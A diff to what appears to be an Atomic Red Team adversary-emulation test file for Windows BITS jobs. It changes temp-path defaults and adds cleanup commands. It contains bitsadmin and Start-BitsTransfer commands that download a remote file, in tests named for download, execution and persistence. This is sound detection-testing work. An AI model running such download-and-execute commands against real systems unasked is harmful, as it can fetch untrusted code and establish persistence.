@@ -18,11 +18,14 @@ atomic_tests:
     local_file:
       description: Local file path to save downloaded file
       type: path
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "%temp%\\bitsadmin_flag.ps1"
   executor:
     name: command_prompt
     command: |
-      bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file} #{local_file}
+      bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
+    cleanup_command: |
+      del #{local_file}
+
 - name: Download & Execute via PowerShell BITS
   description: |
     This test simulates an adversary leveraging bitsadmin.exe to download
@@ -37,11 +40,13 @@ atomic_tests:
     local_file:
       description: Local file path to save downloaded file
       type: path
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "$env:TEMP\\bitsadmin_flag.ps1"
   executor:
     name: powershell
     command: |
       Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
+    cleanup_command: |
+      Remove-Item #{local_file}
 
 - name: Persist, Download, & Execute
   description: |
@@ -61,7 +66,7 @@ atomic_tests:
     local_file:
       description: Local file path to save downloaded file
       type: path
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "%temp%\\bitsadmin_flag.ps1"
     command_path:
       description: Path of command to execute
       type: path
@@ -69,7 +74,7 @@ atomic_tests:
     command_line:
       description: Command line to execute
       type: string
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "%temp%\\bitsadmin_flag.ps1"
   executor:
     name: command_prompt
     command: |
